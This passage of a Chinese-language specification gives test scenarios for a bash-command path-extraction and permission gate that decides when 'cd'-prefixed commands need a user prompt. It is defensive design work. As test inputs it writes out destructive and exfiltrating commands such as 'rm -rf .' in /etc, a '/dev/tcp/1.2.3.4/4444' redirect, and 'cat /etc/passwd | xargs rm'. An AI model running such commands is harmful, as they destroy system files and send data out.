- **WHEN** bash 命令为 `echo hi; cd /tmp && rm -rf .`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——任一复合命令片段的首个 token 为 `cd` 即触发

#### Scenario: cd 后接写入目标触发 tier=three 提示

- **WHEN** bash 命令为 `cd /etc && rm -rf .`，bash-target-extraction 判定为 `{ reliable: false, reason: "cd_chdir" }`
- **THEN** access-decision 决策为 prompt，tier=three，弹窗展示完整命令文本——`cd_chdir` 属于"无法静态解析"的 bash 命令，走兜底弹窗

#### Scenario: cd 后全绝对下游豁免（本 change 新增）

- **WHEN** bash 命令为 `cd /tmp/x && grep -n "pattern" /tmp/x/file`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: true, targets: [read /tmp/x/file] }`，不触发 `cd_chdir`——cd 之后的下游 `grep` 位置参数 `/tmp/x/file` 是显式绝对路径，条件 1/2 满足，豁免适用

#### Scenario: cd 后全绝对重定向豁免（本 change 新增）

- **WHEN** bash 命令为 `cd /tmp/x && echo hi > /tmp/x/out`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: true, targets: [write /tmp/x/out] }`，不触发 `cd_chdir`——重定向目标 `/tmp/x/out` 是显式绝对路径，豁免适用

#### Scenario: cd 后相对重定向 cd 跟踪豁免

- **WHEN** bash 命令为 `cd /tmp/x && echo hi > rel.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: true, targets: [write /tmp/x/rel.txt] }`，不触发 `cd_chdir`——纯 `&&` 链 + 绝对 cd 目标 + 无管道 + 无 cwd 锚点 + 无 glob（cd 跟踪豁免条件 1-5 全满足）；重定向目标 `rel.txt` 按跟踪 cwd `/tmp/x` 解析为 `/tmp/x/rel.txt`（真实落点），而非 `<proj>/rel.txt`。**行为变化（预期）**：原反例判 `cd_chdir`，本 change 后解析出真实写目标 `/tmp/x/rel.txt`——这是「cd 跟踪豁免（治本）」的预期行为变化，非意外回归（真实行为确实是写 `/tmp/x/rel.txt`）

#### Scenario: cd 后相对路径下游 cd 跟踪豁免

- **WHEN** bash 命令为 `cd /tmp/x && grep -n "pattern" file.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: true, targets: [read /tmp/x/file.txt] }`，不触发 `cd_chdir`——cd 跟踪豁免条件 1-5 全满足；`file.txt` 按跟踪 cwd `/tmp/x` 解析为 `/tmp/x/file.txt`（真实落点）。**行为变化（预期）**：原反例判 `cd_chdir`，本 change 后解析出真实读目标 `/tmp/x/file.txt`

#### Scenario: cd 后混合绝对+相对路径 cd 跟踪豁免

- **WHEN** bash 命令为 `cd /tmp/x && cat /tmp/x/a && cat b.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: true, targets: [read /tmp/x/a, read /tmp/x/b.txt] }`，不触发 `cd_chdir`——cd 跟踪豁免条件 1-5 全满足；`/tmp/x/a` 按绝对解析，`b.txt` 按跟踪 cwd `/tmp/x` 解析为 `/tmp/x/b.txt`

#### Scenario: cd 后 glob 相对前缀仍判不可靠（cd 跟踪豁免条件5排除）

- **WHEN** bash 命令为 `cd /tmp/x && ls *.md`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——下游 `ls *.md` 含未加引号 glob，cd 跟踪豁免条件 5 不满足（glob 展开依赖执行时 cwd，cd 跟踪下 cwd 已漂移；且边界①空 prefix 放宽假设 `cwd==projectRoot` 在 cd 链下失效，若放行会误解析到 projectRoot）

#### Scenario: cd 后无显式路径引用仍判不可靠（全绝对下游豁免防空转）

- **WHEN** bash 命令为 `cd /tmp/x; ls`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`;` 分隔，cd 跟踪豁免条件 1 不满足（非纯 `&&` 链，`;` 下 cwd 不可静态确定）；全绝对下游豁免条件 1 不满足（下游 `ls` 无显式路径引用）

#### Scenario: cd 后 SILENT 命令无显式路径引用仍判不可靠（全绝对下游豁免防空转）

- **WHEN** bash 命令为 `cd /proj; npm test`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`;` 分隔，cd 跟踪豁免条件 1 不满足；全绝对下游豁免条件 1 不满足（下游 `npm test` 无显式路径引用，SILENT_COMMANDS 不构成豁免证据）

#### Scenario: cd 后网络套接字重定向仍判不可靠（网络外传防回归）

- **WHEN** bash 命令为 `cd /etc && echo x > /dev/tcp/1.2.3.4/4444`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——重定向目标 `/dev/tcp/1.2.3.4/4444` 虽以 `/` 开头，但属网络套接字目标（`/dev/tcp/` 前缀），网络外传目标不参与 cwd 路径解析：cd 跟踪豁免条件 6 不满足 + 全绝对下游豁免不适用（既有断言 `test/cross-system-boundary.mjs:53` 7.1c 保持 cd_chdir，网络外传不因 cd 豁免被放行）

#### Scenario: cd 相对目标仍判不可靠（cd 跟踪豁免条件2排除）

- **WHEN** bash 命令为 `cd sub && cat file.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——cd 目标 `sub` 是相对路径（受 `CDPATH`/当前 cwd 影响不可静态确定），cd 跟踪豁免条件 2 不满足

#### Scenario: cd 目标含 ~ 仍判不可靠（cd 跟踪豁免条件2排除）

- **WHEN** bash 命令为 `cd ~ && cat file.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——cd 目标 `~` 依赖 `$HOME`，cd 跟踪豁免条件 2 不满足

#### Scenario: cd 目标含变量仍判不可靠（cd 跟踪豁免条件2排除）

- **WHEN** bash 命令为 `cd $HOME && cat file.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——cd 目标含 `$HOME`，cd 跟踪豁免条件 2 不满足

#### Scenario: cd - 仍判不可靠（cd 跟踪豁免条件2排除）

- **WHEN** bash 命令为 `cd /tmp/a && cd - && cat file.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`cd -` 是栈语义（依赖 cwd 历史），cd 跟踪豁免条件 2 不满足

#### Scenario: cd 后管道仍判不可靠（cd 跟踪豁免条件3排除）

- **WHEN** bash 命令为 `cd /tmp/x && cat a.txt | sort`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: true, targets: [read /tmp/x/a.txt] }`，不触发 `cd_chdir`——纯 `&&` 链 + 绝对 cd 目标；管道逐 stage 检查（条件 3 放宽后）：`cat a.txt` stage 的 `a.txt` 是可提取相对路径，按跟踪 cwd `/tmp/x` 解析为真实落点（**行为变化（预期）**：原判 `cd_chdir`，管道语义与下游片段一致，逐 stage 检查无安全增量）

#### Scenario: cd 后零路径引用纯 stdin 管道豁免（本 change 动机案例）

- **WHEN** bash 命令为 `cd /proj && npm test 2>&1 | tail -25`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`，不触发 `cd_chdir`——纯 `&&` 链 + 绝对 cd 目标；管道逐 stage 检查：`npm test` 是 SILENT 命令 0 target，`tail -25` 读 stdin 无路径引用，fd 复制 `2>&1` 不拆分——与无管道的 `cd /proj && npm test` 静默放行语义等价

#### Scenario: cd 后管道含不可提取裸词仍判不可靠（条件 3 放宽后逐 stage 排除）

- **WHEN** bash 命令为 `cd /etc && sort sub | wc -l`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——管道 stage `sort sub` 的位置参数 `sub` 是不可提取裸词（`looksLikePath` 判 false），真实落点 `/etc/sub`，逐 stage 检查命中条件 10，维持 `cd_chdir`

#### Scenario: cd 后管道含 cwd 锚点仍判不可靠（条件 3 放宽后逐 stage 排除）

- **WHEN** bash 命令为 `cd /tmp/x && wc -l . | head -5`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——管道 stage `wc -l .` 含 cwd 锚点 `.`，逐 stage 检查命中条件 4，维持 `cd_chdir`

#### Scenario: cd 后管道含未引号 glob 仍判不可靠（条件 3 放宽后逐 stage 排除）

- **WHEN** bash 命令为 `cd /tmp/x && ls *.md | wc -l`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——管道 stage `ls *.md` 含未加引号 glob（cd 链下 glob 展开依赖漂移后 cwd），逐 stage 检查命中条件 5，维持 `cd_chdir`

#### Scenario: cd 后管道含转发器由转发器守卫兜底（cd 守卫不短路）

- **WHEN** bash 命令为 `cd /etc && cat /etc/passwd | xargs rm`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "forwarding_command" }`——cd 跟踪豁免的管道逐 stage 检查不含转发器排除项（cd 守卫豁免），但 entry 层 cd 守卫豁免后**不短路**后续扫描，转发器命令守卫独立判定 `forwarding_command`；下游 `rm` 是 write 命令，不满足 read-only 下游豁免

#### Scenario: cd 后 git 写子命令位于管道非首 stage 仍判不可靠（条件 11 逐 stage 排除）

- **WHEN** bash 命令为 `cd /etc && git log | xargs git rm`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——条件 11 逐 stage 检查：非首 stage `xargs git rm` 含 git 写子命令 `rm`（不在 `GIT_READONLY_SUBCOMMANDS`），cd 落点 `/etc` 非默认 tmp，维持 `cd_chdir`（逐 stage 化后条件 11 覆盖非首 stage，防片段级检查只看首命令的漏拦）

#### Scenario: cd 片段自身含管道仍判不可靠（条件 3 cd 片段单 stage 约束）

- **WHEN** bash 命令为 `cd /tmp/x | cat && grep pattern file.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——cd 片段自身的 `splitPipelines` 结果非 1 stage（`cd a | b` 语义不可静态确定），条件 3 不满足

#### Scenario: cd 后 cwd 锚点 rm 仍判不可靠（cd 跟踪豁免条件4排除）

- **WHEN** bash 命令为 `cd /etc && rm -rf .`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——下游 `rm -rf .` 含 cwd 锚点 `.`，cd 跟踪豁免条件 4 不满足（`.` 是 cwd 锚点，`extractRedirects`/`looksLikePath` 不提取为 target，若放行会静默放行删 `/etc` 内容）

#### Scenario: cd 后 cwd 锚点重定向仍判不可靠（cd 跟踪豁免条件4排除）

- **WHEN** bash 命令为 `cd /tmp/x && echo hi > ./out.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——重定向目标 `./out.txt` 含 cwd 锚点 `./`，cd 跟踪豁免条件 4 不满足（`./out.txt` 是 cwd-relative 锚点路径，真实落点依赖漂移后 cwd）

#### Scenario: cd 后数字 fd 重定向仍判不可靠（cd 跟踪豁免条件6排除）

- **WHEN** bash 命令为 `cd /tmp/x && echo x > /dev/fd/3`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——重定向目标 `/dev/fd/3` 是数字 fd 目标，cd 跟踪豁免条件 6 不满足（任意 fd 访问目标不参与 cwd 路径解析）

#### Scenario: cd 后不可提取相对参数 rm 仍判不可靠（cd 跟踪豁免条件7排除）

- **WHEN** bash 命令为 `cd /tmp/x && rm -rf sub/`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——写/删命令 `rm` 的位置参数 `sub/` 非显式绝对且 `looksLikePath` 判定为 false（实测 `rm -rf sub/` 提取 0 target），cd 跟踪豁免条件 7 不满足（若放行会静默放行删 `/tmp/x/sub` 内容，安全洞）

#### Scenario: cd 后不可提取相对参数 mkdir 仍判不可靠（cd 跟踪豁免条件7排除）

- **WHEN** bash 命令为 `cd /tmp/x && mkdir sub`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——写命令 `mkdir` 的位置参数 `sub` 非显式绝对且 `looksLikePath` 判定为 false（裸词无 `/` 前缀/`.`/`..`/扩展名），cd 跟踪豁免条件 7 不满足

#### Scenario: cd 后 $PWD 仍判不可靠（cd 跟踪豁免条件8排除）

- **WHEN** bash 命令为 `cd /tmp/x && cat $PWD/foo`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——下游含 `$PWD`，cd 跟踪豁免条件 8 不满足（`$PWD` 是 SAFE_VAR 用真实 env 展开，不随模拟 cwd 漂移，解析会错位）

#### Scenario: cd 后不可提取相对重定向目标仍判不可靠（cd 跟踪豁免条件7排除，本 change 修复）

- **WHEN** bash 命令为 `cd /etc && echo x > sub`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——重定向目标 `sub` 是 `looksLikePath` 判定为 false 的裸词（无扩展名/无 `/` 前缀/无 `.`/`..`），真实落点是 `/etc/sub`（漂移后 cwd），但 `extractRedirects` 提取 0 target；若 cd 跟踪豁免放行会静默放行写 `/etc/sub`（安全洞），条件 7 不满足。**本 change 修复前**：该场景原判 `cd_chdir`（弹窗拦截）→ 修复前 cd 跟踪豁免误判 `reliable:true` + 0 target（静默放行）→ 修复后回到 `cd_chdir`。这是 6.3 人工 review 判出的 critical 安全洞修复，非预期行为变化

#### Scenario: cd 后不可提取 read-only 位置参数仍判不可靠（cd 跟踪豁免条件7排除，本 change 修复）

- **WHEN** bash 命令为 `cd /etc && cat sub`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——read-only 命令 `cat` 的位置参数 `sub` 是 `looksLikePath` 判定为 false 的裸词，真实落点是 `/etc/sub`，但 `readExtract` 提取 0 target；若 cd 跟踪豁免放行会静默放行读 `/etc/sub`（安全洞），条件 7 不满足（条件 7 原只查 write/delete 位置参数，本 change 修复扩展覆盖 read-only 位置参数与重定向目标）。修复前静默放行，修复后 `cd_chdir`

#### Scenario: cd 后无 extractor 命令裸词位置参数仍判不可靠（cd 跟踪豁免条件10排除，F2 修复）

- **WHEN** bash 命令为 `cd /etc && sort sub`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`sort` 不在 `COMMAND_TABLE`（无 extractor），位置参数 `sub` 是 `looksLikePath` 判定为 false 的裸词，真实落点是 `/etc/sub`，但无 extractor 无法提取为 target；若 cd 跟踪豁免放行会静默放行读 `/etc/sub`（安全洞），条件 10 不满足（F2 修复前 `sort` 不在 `FILE_ARG_COMMANDS`，裸词不被 `collectStagePathRefs` 收集，条件 9 看不到 → 豁免成立 + 0 target 静默放行）。修复前静默放行，修复后 `cd_chdir`

#### Scenario: cd 后无 extractor 命令可提取相对路径仍判不可靠（cd 跟踪豁免条件10排除，F2 修复）

- **WHEN** bash 命令为 `cd /tmp/x && sort data.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`sort` 无 extractor 无法消费 `resolveBase` 提取真实落点，`data.txt`（`looksLikePath=true` 可提取相对路径，条件 9 不触发）若豁免放行会 `reliable:true + 0 target` 静默放行读 `/tmp/x/data.txt`（治本落空），条件 10 不满足。这是条件 10 独立于条件 9 的理由：条件 9 只排除不可提取裸词，条件 10 排除无 extractor 命令的一切非绝对位置参数。修复后 `cd_chdir`

#### Scenario: cd 后无 extractor 命令绝对位置参数仍豁免（cd 跟踪豁免条件10 不触发，D2b 对照）

- **WHEN** bash 命令为 `cd /etc && sort /tmp/data.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: true }`——`sort` 无 extractor 但位置参数 `/tmp/data.txt` 是显式绝对路径（不依赖 cwd），全绝对下游豁免（D2b）成立，条件 10 不触发（绝对位置参数不构成 cwd 依赖）。**防过度修复对照**：条件 10 只排除非绝对位置参数，绝对路径位置参数仍走 D2b 豁免，不误伤

#### Scenario: cd 后 tar 操作标志跳过绝对归档仍豁免（D2b 对照）

- **WHEN** bash 命令为 `cd /etc && tar xf /tmp/a.tar`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: true }`——`tar` 操作标志 `xf`（纯字母、不带 `-`、i===1）不是路径引用，跳过它后唯一位置参数 `/tmp/a.tar` 是显式绝对路径，全绝对下游豁免（D2b）成立。**防过度修复对照**：操作标志跳过避免把 `xf` 误判为不可提取裸词导致绝对归档被误伤

#### Scenario: cd 后 git 写子命令 rm 非 tmp 落点仍判不可靠（cd 跟踪豁免条件11排除）

- **WHEN** bash 命令为 `cd /etc && git rm file.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——git 写子命令 `rm`（不在 `GIT_READONLY_SUBCOMMANDS`）修改工作树文件，路径参数是 git 内部管理的 pathspec（本解析器不提取为 target）；cd 落点 `/etc` 非默认 tmp，若豁免放行会 `reliable:true + 0 target` 静默放行删除 `/etc/file.txt`，条件 11 不满足（用户拍板：非 tmp 落点保守排除）

#### Scenario: cd 后 git 写子命令 checkout 非 tmp 落点仍判不可靠（cd 跟踪豁免条件11排除）

- **WHEN** bash 命令为 `cd /etc && git checkout file.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——git 写子命令 `checkout` 覆盖工作树文件，cd 落点 `/etc` 非默认 tmp，条件 11 不满足

#### Scenario: cd 后 git 写子命令 add 非 tmp 落点仍判不可靠（cd 跟踪豁免条件11排除）

- **WHEN** bash 命令为 `cd /etc && git add file.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——git 写子命令 `add` 修改索引，cd 落点 `/etc` 非默认 tmp，条件 11 不满足

#### Scenario: cd 后 git 写子命令 mv 非 tmp 落点仍判不可靠（cd 跟踪豁免条件11排除）

- **WHEN** bash 命令为 `cd /etc && git mv a.txt b.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——git 写子命令 `mv` 重命名工作树文件，cd 落点 `/etc` 非默认 tmp，条件 11 不满足

#### Scenario: cd 后 git 写子命令 rm tmp 落点静默放行（cd 跟踪豁免条件11 不触发）

- **WHEN** bash 命令为 `cd /tmp/x && git rm file.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: true }`——cd 落点 `/tmp/x` 是默认 tmp 目录（`isDefaultTmpPath` 判 true），条件 11 不触发（tmp 无持久安全价值），git 写子命令静默放行（用户拍板：tmp 落点静默放行）

#### Scenario: cd 后 git 写子命令 checkout tmp 落点静默放行（cd 跟踪豁免条件11 不触发）

- **WHEN** bash 命令为 `cd /tmp/x && git checkout file.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: true }`——cd 落点 `/tmp/x` 默认 tmp，条件 11 不触发，静默放行

#### Scenario: cd 后 git 写子命令 rm /var/tmp 落点静默放行（cd 跟踪豁免条件11 不触发）

- **WHEN** bash 命令为 `cd /var/tmp/x && git rm file.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: true }`——cd 落点 `/var/tmp/x` 默认 tmp（B4 已纳入 /var/tmp），条件 11 不触发，静默放行

#### Scenario: cd 后 git 只读子命令 log 静默放行（cd 跟踪豁免条件11 不触发，用户拍板）

- **WHEN** bash 命令为 `cd /etc && git log file.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: true }`——git 只读子命令 `log`（在 `GIT_READONLY_SUBCOMMANDS`）的 pathspec 是 git 内部管理的查询条件，非 shell cwd 文件引用，条件 11 不排除（用户拍板：只读子命令静默放行正确）

#### Scenario: cd 后 git 只读子命令 status 静默放行（cd 跟踪豁免条件11 不触发，用户拍板）

- **WHEN** bash 命令为 `cd /etc && git status`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: true }`——git 只读子命令 `status` 静默放行（用户拍板：pathspec 非 cwd 文件引用）

#### Scenario: cd 后 coreutils 校验和命令裸词位置参数仍判不可靠（条件10 穷尽排除，F2 补漏）

- **WHEN** bash 命令为 `cd /etc && md5sum sub`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`md5sum` 无 extractor 且位置参数 `sub` 是文件引用（校验和类），F2 补漏后加入 `FILE_ARG_COMMANDS`，其裸词被收集，条件 10 排除豁免（若放行会 `reliable:true + 0 target` 静默放行读 /etc/sub，与 F2 critical 同类别同后果）

#### Scenario: cd 后 coreutils 校验和命令 sha512sum 裸词仍判不可靠（条件10 穷尽排除，F2 补漏）

- **WHEN** bash 命令为 `cd /etc && sha512sum sub`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`sha512sum` 无 extractor 文件命令类，条件 10 排除豁免

#### Scenario: cd 后 coreutils 校验和命令 b2sum 裸词仍判不可靠（条件10 穷尽排除，F2 补漏）

- **WHEN** bash 命令为 `cd /etc && b2sum sub`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`b2sum` 无 extractor 文件命令类，条件 10 排除豁免

#### Scenario: cd 后 coreutils 校验和命令 cksum 裸词仍判不可靠（条件10 穷尽排除，F2 补漏）

- **WHEN** bash 命令为 `cd /etc && cksum sub`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`cksum` 无 extractor 文件命令类，条件 10 排除豁免

#### Scenario: cd 后 coreutils 文本比较命令 comm 裸词仍判不可靠（条件10 穷尽排除，F2 补漏）

- **WHEN** bash 命令为 `cd /etc && comm a b`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`comm` 无 extractor 文件命令类，条件 10 排除豁免

#### Scenario: cd 后 coreutils 文本比较命令 join 裸词仍判不可靠（条件10 穷尽排除，F2 补漏）

- **WHEN** bash 命令为 `cd /etc && join a b`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`join` 无 extractor 文件命令类，条件 10 排除豁免

#### Scenario: cd 后 coreutils 文本行处理命令 paste 裸词仍判不可靠（条件10 穷尽排除，F2 补漏）

- **WHEN** bash 命令为 `cd /etc && paste sub`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`paste` 无 extractor 文件命令类，条件 10 排除豁免

#### Scenario: cd 后 coreutils 文本行处理命令 nl 裸词仍判不可靠（条件10 穷尽排除，F2 补漏）

- **WHEN** bash 命令为 `cd /etc && nl sub`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`nl` 无 extractor 文件命令类，条件 10 排除豁免

#### Scenario: cd 后 coreutils 文本行处理命令 cut 裸词仍判不可靠（条件10 穷尽排除，F2 补漏）

- **WHEN** bash 命令为 `cd /etc && cut -d: -f1 sub`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`cut` 无 extractor 文件命令类，`-d:`/`-f1` 是 flag，`sub` 是文件位置参数，条件 10 排除豁免

#### Scenario: cd 后 coreutils 文本行处理命令 tac 裸词仍判不可靠（条件10 穷尽排除，F2 补漏）

- **WHEN** bash 命令为 `cd /etc && tac sub`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`tac` 无 extractor 文件命令类，条件 10 排除豁免

#### Scenario: cd 后 coreutils 文本比较命令 sdiff 裸词仍判不可靠（条件10 穷尽排除，F2 补漏）

- **WHEN** bash 命令为 `cd /etc && sdiff a b`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`sdiff` 无 extractor 文件命令类，条件 10 排除豁免

#### Scenario: cd 后 coreutils 解压命令 gunzip 裸词仍判不可靠（条件10 穷尽排除，F2 补漏）

- **WHEN** bash 命令为 `cd /etc && gunzip sub`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`gunzip` 无 extractor 文件命令类，条件 10 排除豁免

#### Scenario: cd 后 coreutils 解压命令 zcat 裸词仍判不可靠（条件10 穷尽排除，F2 补漏）

- **WHEN** bash 命令为 `cd /etc && zcat sub`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`zcat` 无 extractor 文件命令类，条件 10 排除豁免

#### Scenario: cd 后 coreutils 元数据命令 chgrp 裸词仍判不可靠（条件10 穷尽排除，F2 补漏）

- **WHEN** bash 命令为 `cd /etc && chgrp grp sub`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`chgrp` 无 extractor 文件命令类，`grp` 是组名非路径，`sub` 是文件位置参数，条件 10 排除豁免

#### Scenario: cd 后 coreutils 校验和命令 md5sum 绝对位置参数仍豁免（D2b 对照）

- **WHEN** bash 命令为 `cd /etc && md5sum /tmp/a.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: true }`——`md5sum` 无 extractor 但位置参数 `/tmp/a.txt` 是显式绝对路径（不依赖 cwd），全绝对下游豁免（D2b）成立。**防过度修复对照**：条件 10 只排除非绝对位置参数，绝对路径位置参数仍走 D2b 豁免，不误伤

#### Scenario: cd 后 coreutils 文本行处理命令 paste 绝对位置参数仍豁免（D2b 对照）

- **WHEN** bash 命令为 `cd /etc && paste /tmp/a.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: true }`——`paste` 无 extractor 但位置参数 `/tmp/a.txt` 是显式绝对路径，全绝对下游豁免（D2b）成立。**防过度修复对照**：绝对路径位置参数不误伤

#### Scenario: cd 后目录列举命令 dir 裸词位置参数仍判不可靠（条件10 穷尽排除，F2 补漏二波）

- **WHEN** bash 命令为 `cd /etc && dir sub`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`dir`（ls 变体）无 extractor 且位置参数 `sub` 是文件引用，F2 补漏二波后加入 `FILE_ARG_COMMANDS`，条件 10 排除豁免（若放行会静默列举 /etc/sub）

#### Scenario: cd 后 base64 编码命令裸词仍判不可靠（条件10 穷尽排除，F2 补漏二波）

- **WHEN** bash 命令为 `cd /etc && base64 sub`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`base64` 无 extractor 编码类，条件 10 排除豁免（若放行会静默读取并输出 /etc/sub 内容）

#### Scenario: cd 后路径元数据命令 realpath 裸词仍判不可靠（条件10 穷尽排除，F2 补漏二波）

- **WHEN** bash 命令为 `cd /etc && realpath sub`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`realpath` 无 extractor 路径元数据类（lstat 解析），条件 10 排除豁免

#### Scenario: cd 后 mktemp 模板写类裸词仍判不可靠（条件10 穷尽排除，F2 补漏二波）

- **WHEN** bash 命令为 `cd /etc && mktemp subXXXXXX`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`mktemp` 模板落 cwd：真实创建 `/etc/subXXXXXX`（写类），条件 10 排除豁免

#### Scenario: cd 后 unlink 删除类裸词仍判不可靠（条件10 穷尽排除，F2 补漏二波）

- **WHEN** bash 命令为 `cd /etc && unlink sub`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`unlink` 裸词：真实删除 `/etc/sub`（删除操作静默放行是最高危写形态），条件 10 排除豁免

#### Scenario: cd 后 unlink 绝对位置参数仍豁免（D2b 对照，F2 补漏二波）

- **WHEN** bash 命令为 `cd /etc && unlink /tmp/a.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: true }`——写类命令绝对路径位置参数不依赖 cwd，全绝对下游豁免（D2b）成立。**防过度修复对照**：绝对路径删除目标不误伤

#### Scenario: cd 后 shred 原地覆写命令裸词仍判不可靠（条件10 排除，F2 补漏三波）

- **WHEN** bash 命令为 `cd /etc && shred sub`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`shred` 原地覆写 `/etc/sub`（最高危写形态），条件 10 排除豁免

#### Scenario: cd 后 split 分片写命令裸词仍判不可靠（条件10 排除，F2 补漏三波）

- **WHEN** bash 命令为 `cd /etc && split sub`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`split` 向 cwd 写分片 `xaa`/`xab`…，条件 10 排除豁免

#### Scenario: cd 后 patch stdin 重定向形态仍判不可靠（条件10 排除，F2 补漏三波）

- **WHEN** bash 命令为 `cd /etc && patch -p0 < p.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——`patch` 的 stdin 重定向读 `p.txt`（cwd 相对），条件 10 排除豁免

#### Scenario: cd 后 shred 绝对位置参数仍豁免（D2b 对照，F2 补漏三波）

- **WHEN** bash 命令为 `cd /etc && shred /tmp/a.txt`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: true }`——绝对路径覆写目标不依赖 cwd，全绝对下游豁免（D2b）成立。**防过度修复对照**：绝对路径覆写目标不误伤

#### Scenario: cd 后绝对路径命令含重定向 token 豁免（本 change 新增）

- **WHEN** bash 命令为 `cd /tmp/x && ls /tmp/x 2>/dev/null`
- **THEN** 不判 `cd_chdir`（全绝对下游豁免成立——`2>/dev/null` 是重定向 token，不构成位置参数；`/tmp/x` 位置参数与 `/dev/null` 重定向目标均绝对），提取结果 `reliable: true`，targets 含 `/tmp/x`（读）

